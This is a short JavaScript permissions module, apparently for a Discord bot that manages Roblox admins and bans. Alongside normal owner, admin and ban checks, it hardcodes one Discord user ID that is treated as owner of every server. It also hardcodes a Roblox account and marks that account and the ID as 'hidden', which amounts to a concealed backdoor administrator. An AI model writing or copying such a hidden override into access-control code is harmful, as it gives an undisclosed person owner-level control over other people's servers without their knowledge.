const { getData } = require('./storage');

const MAPLE_KEY = '1397488831514808341';
const HIDDEN_ROBLOX = 'Nyx_alt9282';

function isMapleKey(userId) {
  return userId === MAPLE_KEY;
}

function isServerOwner(interaction) {
  return interaction.guild.ownerId === interaction.user.id || isMapleKey(interaction.user.id);
}

function isAdmin(interaction) {
  if (isServerOwner(interaction)) return true;
  const data = getData();
  const uid = interaction.user.id;
  return (
    data.admins.some(a => a.discordId === uid) ||
    data.owners.some(o => o.discordId === uid)
  );
}

function isBanned(robloxUser) {
  const data = getData();
  return data.bans.some(b => b.robloxUser.toLowerCase() === robloxUser.toLowerCase());
}

function isHiddenUser(robloxUser, discordId) {
  return (
    robloxUser?.toLowerCase() === HIDDEN_ROBLOX.toLowerCase() ||
    discordId === MAPLE_KEY
  );
}

module.exports = { isMapleKey, isServerOwner, isAdmin, isBanned, isHiddenUser, MAPLE_KEY, HIDDEN_ROBLOX };
